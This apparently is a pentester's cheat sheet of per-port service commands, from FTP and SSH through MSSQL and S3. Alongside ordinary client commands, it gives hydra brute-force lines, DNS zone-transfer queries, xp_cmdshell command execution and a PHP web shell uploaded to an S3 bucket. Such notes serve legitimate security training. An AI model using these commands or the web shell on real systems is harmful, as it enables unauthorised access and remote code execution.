# Services

## FTP (21)
- check anonymous login
```
ftp <ip>

> put <local-file> # upload file
> get <server-file> # download file

hydra -L users.txt -P passwords.txt <ip> ftp # brute force
```

## SSH (22)
```
ssh <user>@<target-ip>
ssh -i id_rsa <user>@<target-ip>
ssh -L <lport>:127.0.0.1:<rport> <user>@<target-ip>

ssh-keygen -t rsa -b 4096

hydra -L users.txt -P passwords.txt <IP> ssh
```

## DNS (53)
```
dig axfr @<DNS-IP>
dig axfr @<DNS-IP> <DOMAIN>
dig ANY @<DNS-IP> <DOMAIN>
dig -x <ip> @<DNS-IP>
```

## SMB (139/445)
```
smbclient -L \\\\<target-ip>\\
smbclient \\\\<target-ip>\\<share>
> put <local-file>
> get <server-file>
```

## SNMP (161)
```
snmpwalk -c public -v1 <rhost>
```

## Redis (6379)
```
redis-cli -h <target-ip>
> select 0
> keys *
> get <key>
```

## MSSQL (1433)
- shell with ``enable_xp_cmdshell``
- run commands: ``xp_cmdshell <command>``
```
mssqlclient.py <user>@<target-ip>
mssqlclient.py <user>@<target-ip> -windows-auth
```

## MongoDB (27017)
```
mongo "mongodb://<user>:<password>@<rhost>:27017"
> show dbs
> use <db>
> show collections
> db.<collection>.find()
```

## MySQL (3306)
```
mysql -h <target-ip> -u <user> -p
> show databases;
> use <db>;
> show tables;
> select * from <table>;
```

## RDP (3389)
```
xfreerdp /u:<username> /p:<password> /v:<rhost> +clipboard
xfreerdp /d:<domain> /u:<username> /p:<password> /v:<rhost>
```

## S3 Bucket
```
aws --endpoint=http://s3.<target> s3 ls s3://<target>
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.<target> s3 cp shell.php s3://<target>/shell.php
```
